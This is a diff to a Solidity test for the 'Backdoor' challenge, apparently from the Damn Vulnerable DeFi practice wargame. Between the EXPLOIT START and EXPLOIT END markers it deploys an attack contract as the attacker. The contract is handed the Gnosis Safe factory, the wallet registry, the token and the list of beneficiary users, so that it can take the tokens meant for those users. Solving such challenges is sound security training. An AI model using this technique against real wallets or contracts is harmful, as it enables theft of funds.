@@ -9,6 +9,8 @@ import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 
+import {AttackBackdoor} from "../../../src/Contracts/attack/AttackBackdoor.sol";
+
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
     uint256 internal constant NUM_USERS = 4;
@@ -79,6 +81,23 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+
+        console.log(attacker);
+
+        vm.startPrank(attacker);
+
+        // Deploy the attack contract
+        AttackBackdoor attackBackDoor = new AttackBackdoor(
+            attacker,
+            address(masterCopy),
+            address(dvt),
+            address(walletFactory),
+            address(walletRegistry),
+            users,
+            abi.encodeWithSignature("setupToken()")
+        );
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
